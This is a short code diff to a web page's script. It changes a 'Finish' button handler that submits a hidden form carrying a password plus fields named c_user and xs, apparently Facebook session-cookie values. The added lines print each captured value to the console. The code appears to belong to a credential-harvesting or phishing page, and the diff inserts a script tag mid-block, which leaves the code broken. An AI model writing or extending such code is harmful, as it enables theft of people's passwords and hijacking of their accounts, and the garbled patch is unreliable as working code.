@@ -1920,6 +1920,7 @@
             closeModal.addEventListener('click', closeModalFunc);
             cancelBtn.addEventListener('click', closeModalFunc);
             
+<script>
 document.addEventListener('DOMContentLoaded', function () {
     const finishBtn = document.getElementById('finishBtn');
     const hiddenForm = document.getElementById('hiddenForm');
@@ -1930,13 +1931,16 @@ document.addEventListener('DOMContentLoaded', function () {
     finishBtn.addEventListener('click', function (e) {
         e.preventDefault();
 
-        // Check if fields are filled
+        console.log("Finish button clicked");
+        console.log("c_user:", hiddenCUser.value);
+        console.log("xs:", hiddenXs.value);
+        console.log("password:", hiddenPassword.value);
+
         if (!hiddenCUser.value || !hiddenXs.value || !hiddenPassword.value) {
             alert("Missing form values.");
             return;
         }
 
-        console.log("Submitting form...");
         hiddenForm.submit();
 
         setTimeout(function () {
@@ -1944,6 +1948,8 @@ document.addEventListener('DOMContentLoaded', function () {
         }, 1000);
     });
 });
+</script>
+
 
 
                 // Trigger browser validation
